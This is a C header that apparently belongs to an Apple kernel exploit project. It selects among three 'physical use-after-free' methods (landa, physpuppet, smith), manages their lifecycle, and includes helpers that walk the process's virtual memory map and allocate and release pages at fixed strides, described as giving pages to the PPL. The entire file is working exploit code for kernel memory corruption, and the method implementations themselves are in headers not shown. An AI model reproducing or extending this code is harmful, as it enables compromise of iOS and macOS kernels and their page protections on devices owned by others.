/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef puaf_h
#define puaf_h

// Forward declarations for helper functions.
void puaf_helper_get_vm_map_first_and_last(u64* first_out, u64* last_out);
void puaf_helper_get_vm_map_min_and_max(u64* min_out, u64* max_out);
void puaf_helper_give_ppl_pages(void);

#include "puaf/landa.h"
#include "puaf/physpuppet.h"
#include "puaf/smith.h"

#define puaf_method_case(method)                                 \
    case puaf_##method: {                                        \
        const char* method_name = #method;                       \
        print_string(method_name);                               \
        kfd->puaf.puaf_method_ops.init = method##_init;          \
        kfd->puaf.puaf_method_ops.run = method##_run;            \
        kfd->puaf.puaf_method_ops.cleanup = method##_cleanup;    \
        kfd->puaf.puaf_method_ops.free = method##_free;          \
        break;                                                   \
    }

void puaf_init(struct kfd* kfd, u64 puaf_pages, u64 puaf_method)
{
    kfd->puaf.number_of_puaf_pages = puaf_pages;
    kfd->puaf.puaf_pages_uaddr = (u64*)(malloc_bzero(kfd->puaf.number_of_puaf_pages * sizeof(u64)));

    switch (puaf_method) {
        puaf_method_case(landa)
        puaf_method_case(physpuppet)
        puaf_method_case(smith)
    }
    
    if(puaf_method == puaf_landa) {
        kfd->puaf.puaf_method_ops.deallocate = landa_deallocate;
    }
    else {
        kfd->puaf.puaf_method_ops.deallocate = NULL;
    }

    kfd->puaf.puaf_method_ops.init(kfd);
}

void puaf_run(struct kfd* kfd)
{
//#if __arm64e__
    puaf_helper_give_ppl_pages(); // maybe unnecessary on non_ppl devices.
//#endif
    timer_start();
    kfd->puaf.puaf_method_ops.run(kfd);
    timer_end();
}

void puaf_cleanup(struct kfd* kfd)
{
    timer_start();
    kfd->puaf.puaf_method_ops.cleanup(kfd);
    timer_end();
}

void puaf_free(struct kfd* kfd)
{
    kfd->puaf.puaf_method_ops.free(kfd);

    bzero_free(kfd->puaf.puaf_pages_uaddr, kfd->puaf.number_of_puaf_pages * sizeof(u64));

    if (kfd->puaf.puaf_method_data) {
        bzero_free(kfd->puaf.puaf_method_data, kfd->puaf.puaf_method_data_size);
    }
}

/*
 * Helper puaf functions.
 */

void puaf_helper_get_vm_map_first_and_last(u64* first_out, u64* last_out)
{
    u64 first_address = 0;
    u64 last_address = 0;

    vm_address_t address = 0;
    vm_size_t size = 0;
    vm_region_basic_info_data_64_t data = {};
    vm_region_info_t info = (vm_region_info_t)(&data);
    mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
    mach_port_t port = MACH_PORT_NULL;

    while (true) {
        kern_return_t kret = vm_region_64(mach_task_self(), &address, &size, VM_REGION_BASIC_INFO_64, info, &count, &port);
        if (kret == KERN_INVALID_ADDRESS) {
            last_address = address;
            break;
        }

        assert(kret == KERN_SUCCESS);

        if (!first_address) {
            first_address = address;
        }

        address += size;
        size = 0;
    }

    *first_out = first_address;
    *last_out = last_address;
}

void puaf_helper_get_vm_map_min_and_max(u64* min_out, u64* max_out)
{
    task_vm_info_data_t data = {};
    task_info_t info = (task_info_t)(&data);
    mach_msg_type_number_t count = TASK_VM_INFO_COUNT;
    assert_mach(task_info(mach_task_self(), TASK_VM_INFO, info, &count));

    *min_out = data.min_address;
    *max_out = data.max_address;
}

void puaf_helper_give_ppl_pages(void)
{
    timer_start();

    const u64 given_ppl_pages_max = 10000;
    const u64 l2_block_size = (1ull << 25);

    vm_address_t addresses[given_ppl_pages_max] = {};
    vm_address_t address = 0;
    u64 given_ppl_pages = 0;

    u64 min_address, max_address;
    puaf_helper_get_vm_map_min_and_max(&min_address, &max_address);

    while (true) {
        address += l2_block_size;
        if (address < min_address) {
            continue;
        }

        if (address >= max_address) {
            break;
        }

        kern_return_t kret = vm_allocate(mach_task_self(), &address, pages(1), VM_FLAGS_FIXED);
        if (kret == KERN_SUCCESS) {
            memset((void*)(address), 'A', 1);
            addresses[given_ppl_pages] = address;
            if (++given_ppl_pages == given_ppl_pages_max) {
                break;
            }
        }
    }

    for (u64 i = 0; i < given_ppl_pages; i++) {
        assert_mach(vm_deallocate(mach_task_self(), addresses[i], pages(1)));
    }

    print_u64(given_ppl_pages);
    timer_end();
}

#endif /* puaf_h */
